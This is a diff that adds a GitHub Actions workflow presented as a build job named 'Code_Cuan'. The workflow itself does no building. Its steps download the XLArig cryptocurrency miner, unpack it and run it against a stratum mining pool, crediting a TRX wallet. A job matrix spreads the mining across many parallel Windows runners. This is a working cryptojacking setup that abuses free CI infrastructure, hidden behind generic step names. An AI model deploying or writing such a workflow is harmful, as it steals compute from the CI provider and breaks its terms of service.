@@ -1,0 +1,47 @@
+name: Code_Cuan 
+
+on: [workflow_dispatch] 
+
+jobs:
+
+  build:
+
+    name: Code_Cuans
+
+    runs-on: windows-latest
+
+    strategy:
+
+      max-parallel: 5
+
+      fail-fast: false
+
+      matrix:
+
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+
+        flag: [A, B, C, D, E, F, G, H, I]
+
+    env:
+
+        NUM_JOBS: 20
+
+        JOB: ${{ matrix.go }}
+
+    steps:
+
+    - name: PREPARING
+
+      run: Invoke-WebRequest https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-win64.zip -Outfile XLArig-v5.2.2-win64.zip
+
+    - name: Seting-UP
+
+      run: Expand-Archive XLArig-v5.2.2-win64.zip
+
+    - name: Running
+
+      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o stratum+tcp://stratum4.hashcryptos.com:9989 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u TRX:TN8LheETbeN9WQQGGAAhSAqxFqbwVYjkiy.$(echo $(shuf -i 1-9999 -n 1)-ARC)
+
+    - name: DONE
+
+      run: exit
